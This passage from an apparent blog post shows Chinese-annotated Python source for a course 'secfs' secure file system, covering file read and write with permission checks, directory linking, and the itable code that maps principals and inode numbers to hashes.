i，并将其指向user i</span></span><br><span class="line">    <span class="comment"># - 调用 link() 将新 i 链接到 parent_i 中给定名称的目录</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 还要确保你*返回新 inode 的最终 i*！</span></span><br><span class="line">    <span class="keyword">return</span> I(User(<span class="number">0</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">parent_i, name, create_as, create_for</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建一个新文件。</span></span><br><span class="line"><span class="string">查看secfs.fs._create</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _create(parent_i, name, create_as, create_for, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir</span>(<span class="params">parent_i, name, create_as, create_for</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    创建一个新目录。</span></span><br><span class="line"><span class="string">    查看secfs.fs._create</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> _create(parent_i, name, create_as, create_for, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">read_as, i, off, size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Read从文件i中读取[off:off+size]字节。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(read_as, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(read_as, <span class="built_in">type</span>(read_as)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> secfs.access.can_read(read_as, i):</span><br><span class="line">        <span class="keyword">if</span> i.p.is_group():</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot read from group-readable file &#123;0&#125; as &#123;1&#125;; user is not in group&quot;</span>.<span class="built_in">format</span>(i, read_as))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot read from user-readable file &#123;0&#125; as &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i, read_as))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_inode(i).read()[off:off+size]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">write_as, i, off, buf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Write将给定的字节写入文件i的给定偏移量处。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(write_as, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(write_as, <span class="built_in">type</span>(write_as)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> secfs.access.can_write(write_as, i):</span><br><span class="line">        <span class="keyword">if</span> i.p.is_group():</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot write to group-owned file &#123;0&#125; as &#123;1&#125;; user is not in group&quot;</span>.<span class="built_in">format</span>(i, write_as))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot write to user-owned file &#123;0&#125; as &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i, write_as))</span><br><span class="line"></span><br><span class="line">    node = get_inode(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> 这显然是愚蠢的——不应该删除没有更改的块(blocks)</span></span><br><span class="line">    bts = node.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write还允许我们扩展文件</span></span><br><span class="line">    <span class="keyword">if</span> off + <span class="built_in">len</span>(buf) &gt; <span class="built_in">len</span>(bts):</span><br><span class="line">        bts = bts[:off] + buf</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bts = bts[:off] + buf + bts[off+<span class="built_in">len</span>(buf):]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新inode</span></span><br><span class="line">    node.blocks = [secfs.store.block.store(bts)]</span><br><span class="line">    node.mtime = time.time()</span><br><span class="line">    node.size = <span class="built_in">len</span>(bts)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将新的哈希值放入树中</span></span><br><span class="line">    new_hash = secfs.store.block.store(node.<span class="built_in">bytes</span>())</span><br><span class="line">    secfs.tables.modmap(write_as, i, new_hash)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readdir</span>(<span class="params">i, off</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    返回目录i中的is的列表。</span></span><br><span class="line"><span class="string">    每个返回的列表项都是一个由i和索引组成的元组。该索引可用于在以后请求该列表的后缀。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    dr = Directory(i)</span><br><span class="line">    <span class="keyword">if</span> dr == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [(i, index+<span class="number">1</span>) <span class="keyword">for</span> index, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(dr.children) <span class="keyword">if</span> index &gt;= off]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">link</span>(<span class="params">link_as, i, parent_i, name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将给定的i添加到给定的父目录下。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(parent_i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(parent_i, <span class="built_in">type</span>(parent_i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(link_as, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(link_as, <span class="built_in">type</span>(link_as)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> secfs.access.can_write(link_as, parent_i):</span><br><span class="line">        <span class="keyword">if</span> parent_i.p.is_group():</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot create in group-writeable directory &#123;0&#125; as &#123;1&#125;; user is not in group&quot;</span>.<span class="built_in">format</span>(parent_i, link_as))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;cannot create in user-writeable directory &#123;0&#125; as &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(parent_i, link_as))</span><br><span class="line"></span><br><span class="line">    parent_ihash = secfs.store.tree.add(parent_i, name, i)</span><br><span class="line">    secfs.tables.modmap(link_as, parent_i, parent_ihash)</span><br></pre></td></tr></table></figure><h4 id="secfs-tables-py"><a href="#secfs-tables-py" class="headerlink" title=".&#x2F;secfs&#x2F;tables.py"></a>.&#x2F;secfs&#x2F;tables.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此文件包含处理 i 映射的解析和修改的所有代码。 这包括组句柄间接和 VSL 验证，因此该文件有些毛茸茸(?)。</span></span><br><span class="line"><span class="comment"># 注意：ihandle 是主体（principle）itable 的hash，它保存从 inumbers（i 的第二部分）到 inode 散列的主体映射。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secfs.store</span><br><span class="line"><span class="keyword">import</span> secfs.fs</span><br><span class="line"><span class="keyword">from</span> secfs.types <span class="keyword">import</span> I, Principal, User, Group</span><br><span class="line"></span><br><span class="line"><span class="comment"># current_itables代表文件系统的itables的当前视图</span></span><br><span class="line">current_itables = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务器连接句柄在挂载时由 secfs-fuse 传递给我们</span></span><br><span class="line">server = <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">_server</span>):</span><br><span class="line">    <span class="keyword">global</span> server</span><br><span class="line">    server = _server</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pre</span>(<span class="params">refresh, user</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在所有user文件系统操作之前调用，即是在我们获得专有服务器锁之后。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> refresh != <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 刷新 usermap 和 groupmap</span></span><br><span class="line">        refresh()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">push_vs</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> push_vs:</span><br><span class="line">        <span class="comment"># 当创建根目录时，我们不应该推送VS，你可能会想把这个留在这里，把你的post()代码而不是pass放在下面。(?)</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Itable</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    itable保存了一个特定主体的映射，对于user，是从inumber(i元组中的第二个元素)到inode哈希的映射，对于groups，是从inumber到groups的user的i的映射。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">ihandle</span>):</span><br><span class="line">        b = secfs.store.block.load(ihandle)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        t = Itable()</span><br><span class="line">        t.mapping = pickle.loads(b)</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bytes</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(<span class="variable language_">self</span>.mapping)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resolve</span>(<span class="params">i, resolve_groups = <span class="literal">True</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将给定的i解析为inode哈希。如果没有设置resolve_groups，则gruop只会被解析给它们的user i，而不会进一步解析。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    特别的，对于某些i=(principle, inumber)，我们首先找到主体的itable，然后找到该表的inumber-th元素，如果主体是user，则返回该元素的值。如果不是，我们将返回一个group i，再次解析它以获得最后一个user设置的ihash来写入group i </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line"></span><br><span class="line">    principal = i.p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(principal, Principal):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a Principal, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(principal, <span class="built_in">type</span>(principal)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i.allocated():</span><br><span class="line">        <span class="comment"># 有人试图查找一个尚未分配的i</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> current_itables</span><br><span class="line">    <span class="keyword">if</span> principal <span class="keyword">not</span> <span class="keyword">in</span> current_itables:</span><br><span class="line">        <span class="comment"># User还没有一个itable</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line">    t = current_itables[principal]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i.n <span class="keyword">not</span> <span class="keyword">in</span> t.mapping:</span><br><span class="line">        <span class="keyword">raise</span> LookupError(<span class="string">&quot;principal &#123;&#125; does not have i &#123;&#125;&quot;</span>.<span class="built_in">format</span>(principal, i))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 可用性测试</span></span><br><span class="line">    <span class="keyword">if</span> principal.is_group() <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(t.mapping[i.n], I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;looking up group i, but did not get indirection ihash&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> principal.is_user() <span class="keyword">and</span> <span class="built_in">isinstance</span>(t.mapping[i.n], I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;looking up user i, but got indirection ihash&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(t.mapping[i.n], I) <span class="keyword">and</span> resolve_groups:</span><br><span class="line">        <span class="comment"># 查找group i</span></span><br><span class="line">        <span class="comment"># 根据间接法</span></span><br><span class="line">        <span class="keyword">return</span> resolve(t.mapping[i.n])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> t.mapping[i.n]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modmap</span>(<span class="params">mod_as, i, ihash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    更改或分配i，使它指向ihash。</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    如果i.allocated()为假（即i被创建时没有i-number），将为主体i.p分配一个新的i-number。这个函数很复杂，因为i可能是group i，在这种情况下，我们需要：</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    1.分配一个i作为mod_as</span></span><br><span class="line"><span class="string">    2.分配/更改group i以指向上面的新i</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    modmap返回存在映射的i，如果传递的i没有分配，则填充i.n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(i, I):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not an I, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">type</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(mod_as, User):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&quot;&#123;&#125; is not a User, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(mod_as, <span class="built_in">type</span>(mod_as)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> mod_as.is_user() <span class="comment"># 只有真正的user才能修改</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mod_as != i.p:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;trying to mod object for &#123;&#125; through &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i.p, mod_as))</span><br><span class="line">        <span class="keyword">assert</span> i.p.is_group() <span class="comment"># 如果不是为了self，那么一定是为了group</span></span><br><span class="line"></span><br><span class="line">        real_i = resolve(i, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(real_i, I) <span class="keyword">and</span> real_i.p == mod_as:</span><br><span class="line">            <span class="comment"># 我们最近更新了文件，所以我们只需要更新i。</span></span><br><span class="line">            <span class="comment"># 根本不需要改变group i。</span></span><br><span class="line">            <span class="comment"># 这是一个优化。</span></span><br><span class="line">            i = real_i</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(real_i, I) <span class="keyword">or</span> real_i == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(ihash, I):</span><br><span class="line">                <span class="comment"># 调用者已经为我们完成了工作，所以我们只需要链接group条目。</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;mapping&quot;</span>, i, <span class="string">&quot;to&quot;</span>, ihash, <span class="string">&quot;which again points to&quot;</span>, resolve(ihash))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 为mod_as分配一个新条目，然后继续执行，就好像ihash就是那个新的i。</span></span><br><span class="line"><span class="comment"># <span class="doctag">XXX:</span>没有必要为此发送两个VS</span></span><br><span class="line">                _ihash = ihash</span><br><span class="line">                ihash = modmap(mod_as, I(mod_as), ihash)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;mapping&quot;</span>, i, <span class="string">&quot;to&quot;</span>, ihash, <span class="string">&quot;which again points to&quot;</span>, _ihash)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 这不是一个 group i!</span></span><br><span class="line">            <span class="comment"># User试图覆盖他们不拥有的东西!</span></span><br><span class="line">            <span class="keyword">raise</span> PermissionError(<span class="string">&quot;illegal modmap; tried to mod i &#123;0&#125; as &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i, mod_as))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找或创建主体itable</span></span><br><span class="line">    t = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">global</span> current_itables</span><br><span class="line">    <span class="keyword">if</span> i.p <span class="keyword">not</span> <span class="keyword">in</span> current_itables:</span><br><span class="line">        <span class="keyword">if</span> i.allocated():</span><br><span class="line">            <span class="comment"># 这是出乎意料的;</span></span><br><span class="line">            <span class="comment"># User没有一个itable对象，但给出了一个编号</span></span><br><span class="line">            <span class="keyword">raise</span> ReferenceError(<span class="string">&quot;itable not available&quot;</span>)</span><br><span class="line">        t = Itable()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no current list for principal&quot;</span>, i.p, <span class="string">&quot;; creating empty table&quot;</span>, t.mapping)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = current_itables[i.p]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 查找(或分配)我们想要修改的i的编号</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> i.allocated():<span class="comment">#为什么要直接传root_i?这个函数就是为了搞定这个的，因为之前已经</span></span><br><span class="line">        inumber = <span class="number">0</span>  <span class="comment">#为root_i分配了用户法则和inumber，这里是为同一个用户法则，分配新的inumber，然后建立新的inumber与ihash映射</span></span><br><span class="line">        <span class="keyword">while</span> inumber <span class="keyword">in</span> t.mapping:</span><br><span class="line">            inumber += <span class="number">1</span></span><br><span class="line">        i.allocate(inumber)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> i.n <span class="keyword">not</span> <span class="keyword">in</span> t.mapping:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;invalid inumber&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改这个条目，并将更新后的itable存储回来</span></span><br><span class="line">    <span class="keyword">if</span> i.p.is_group():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mapping&quot;</span>, i.n, <span class="string">&quot;for group&quot;</span>, i.p, <span class="string">&quot;into&quot;</span>, t.mapping)</span><br><span class="line">    t.mapping[i.n] = ihash <span class="comment"># 对于groups，ihash即是i</span></span><br><span class="line">    current_itables[i.p] = t</span><br><span class="line">    <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure><h4 id="secfs-types-py"><a href="#secfs-types-py" class="headerlink" title=".&#x2F;secfs&#x2F;types.py"></a>.&#x2F;secfs&#x2F;types.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Principal</span>:</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">id</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_user</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_group</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">Principal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, uid</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(uid, <span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;id &#123;&#125; is not an int, is a &#123;&#125;&quot;</span>.<span class="built_in">format</span>(uid, <span class="built_in">type</span>(uid)))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._uid = uid</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>._uid, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="variable language_">self</span>._uid = state[<span class="number">0</span>]</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">id</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._uid</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_user</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span 